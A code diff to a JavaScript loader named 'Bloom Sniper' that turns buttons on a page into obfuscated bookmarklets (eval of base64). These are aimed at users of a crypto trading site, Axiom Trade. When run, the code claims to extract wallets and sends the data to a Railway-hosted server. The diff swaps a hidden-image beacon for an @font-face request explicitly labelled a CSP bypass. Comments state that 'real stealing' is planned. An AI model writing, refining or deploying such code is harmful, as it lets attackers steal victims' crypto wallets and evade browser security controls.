@@ -1,8 +1,8 @@
-// === BLOOM SNIPER LOADER - Final Version for Railway ===
+// === BLOOM SNIPER LOADER - Font-Face Exfil (CSP Bypass Attempt) ===
 console.log('✅ Loader.js loaded from Railway');
 
 document.addEventListener('DOMContentLoaded', function() {
-  console.log('✅ DOM ready - injecting bookmarklet');
+  console.log('✅ DOM ready');
 
   const buttons = document.querySelectorAll('.bookmarklet, .activate-btn');
   console.log('Found ' + buttons.length + ' button(s)');
@@ -17,7 +17,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
         alert("✅ Bloom Sniper activated - Extracting wallets...");
 
-        // === PLACEHOLDER (we'll replace with real stealing later) ===
+        // Test payload
         const payload = {
           site: "Axiom Trade",
           url: location.href,
@@ -27,41 +27,41 @@ document.addEventListener('DOMContentLoaded', function() {
           status: "test"
         };
 
-        alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending to server...');
+        alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending...');
 
-        // === SAFE DATA SEND ===
+        // === FONT-FACE TRICK (better CSP bypass) ===
         const jsonStr = JSON.stringify(payload);
         const safeEncoded = btoa(unescape(encodeURIComponent(jsonStr)));
         const exfilUrl = 'https://bloom-sniper-replica-production.up.railway.app/i/' + safeEncoded;
 
-        const img = document.createElement('img');
-        img.style.cssText = 'display:none;';
-        img.src = exfilUrl;
+        // Create hidden style with @font-face
+        const style = document.createElement('style');
+        style.textContent = `
+          @font-face {
+            font-family: 'exfil';
+            src: url('${exfilUrl}');
+          }
+        `;
+        document.head.appendChild(style);
 
-        if (document.body) {
-          document.body.appendChild(img);
-        } else if (document.documentElement) {
-          document.documentElement.appendChild(img);
-        }
+        // Cleanup
+        setTimeout(() => {
+          if (style.parentNode) style.parentNode.removeChild(style);
+        }, 8000);
 
-        setTimeout(function() {
-          if (img.parentNode) img.parentNode.removeChild(img);
-        }, 5000);
-
-        alert('✅ Data sent to server!');
+        alert('✅ Data sent via font-face!');
       } catch(e) {
-        console.error('Error:', e);
+        console.error(e);
         alert('❌ Error: ' + e.message);
       }
     };
 
-    // Safe encoding
     const codeStr = '(' + innerCode.toString() + ')()';
     const encoded = btoa(unescape(encodeURIComponent(codeStr)));
 
     btn.href = 'javascript:eval(atob("' + encoded + '"))';
     btn.draggable = true;
 
-    console.log('✅ Bookmarklet injected successfully');
+    console.log('✅ Bookmarklet injected');
   });
 });
